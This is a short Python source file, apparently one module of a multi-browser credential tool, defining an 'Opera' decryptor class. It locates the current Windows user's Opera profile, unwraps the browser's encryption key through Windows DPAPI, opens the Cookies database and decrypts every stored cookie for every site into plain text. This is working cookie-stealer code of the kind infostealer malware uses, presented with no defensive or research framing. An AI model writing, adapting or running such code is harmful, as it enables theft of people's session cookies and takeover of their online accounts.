from decryptors.Decryptor import Decryptor
import os
import win32crypt
import base64
import sqlite3
import json
from Crypto.Cipher import AES

class Opera(Decryptor):
    opera_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Opera Software\\Opera Stable\\"


    def Decrypt(self):
        out = []

        if(os.path.exists(Opera.opera_path)):
            with open(os.path.join(Opera.opera_path, "Local State"), "r") as file:
                json_obj = json.loads(file.read())
                encrypted_key = json_obj["os_crypt"]["encrypted_key"]
                encrypted_key_base64 = base64.b64decode(encrypted_key)[5:]
                key = win32crypt.CryptUnprotectData(encrypted_key_base64)[1]

            connection = sqlite3.connect(os.path.join(Opera.opera_path, "Network", "Cookies"))
            cursor = connection.cursor()

            cursor.execute("SELECT host_key, name, encrypted_value FROM 'cookies';")

            for host_key, name, encrypted_val in cursor.fetchall():
                nonce = encrypted_val[3:15]
                val = encrypted_val[15:-16]

                cipher = AES.new(key = key, mode = AES.MODE_GCM, nonce = nonce)
                out.append({
                    "host": host_key,
                    "name": name,
                    "value": cipher.decrypt(val).decode("utf-8")
                })
                
            cursor.close()
            connection.close()
        
        return out
    
    def GetBrowser(self):
        return "Opera"